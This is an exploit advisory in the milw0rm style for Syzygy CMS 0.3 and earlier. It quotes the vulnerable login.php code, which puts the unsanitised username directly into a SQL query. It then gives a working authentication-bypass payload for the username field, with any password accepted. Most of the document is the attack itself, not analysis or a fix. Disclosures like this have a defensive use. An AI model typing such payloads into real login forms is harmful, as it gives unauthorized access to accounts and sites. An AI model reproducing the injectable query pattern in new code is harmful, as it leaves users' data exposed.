<html><head><title>Syzygy CMS <= 0.3 (Auth Bypass) SQL Injection Vulnerability</title></head><pre>--+++=========================================================================+++--
--+++====== Syzygy CMS &lt;= 0.3 (Auth Bypass) SQL Injection Vulnerability ======+++--
--+++=========================================================================+++--

[+] Syzygy CMS &lt;= 0.3 (Auth Bypass) SQL Injection Vulnerability
[+] Author : darkjoker
[+] Site   : http://darkjoker.net23.net
[+] Greetz : my girlfriend, Vivi
[+] File   : login.php

[+] Code:
    17  $username=$_POST['username'];
    18  $password=md5($_POST['password']);
    19  $current_login=mysql_query(&quot;SELECT * FROM &quot;.$mysql_prefix.&quot;users WHERE username='&quot;.$username.&quot;' AND password='&quot;.$password.&quot;'&quot;);
    20
    21  if (mysql_num_rows($current_login)==0)
    22  {
    23          header(&quot;Location: http://&quot;.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']).&quot;/&quot;.&quot;index.php?page=invalid.php&quot;);
    24  } else {
    25		$current_user=mysql_fetch_array($current_login, MYSQL_ASSOC);
    26		$_SESSION['user']=$current_user['username'];
    27		$_SESSION['perms']=$current_user['perms'];
    28 		$style_query=mysql_query(&quot;SELECT filename FROM &quot;.$mysql_prefix.&quot;layout_style WHERE id='&quot;.$current_user['style'].&quot;'&quot;);
    29		$style_info=mysql_fetch_array($style_query,MYSQL_ASSOC);
    30 		$_SESSION['style']=$style_info['filename'];
    31		header(&quot;Location: http://&quot;.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']).&quot;/&quot;.&quot;index.php&quot;);
    32  }

[+] Username: x' OR 'x' = 'x'#
[+] Password: anything

# milw0rm.com [2009-01-14]</pre></html>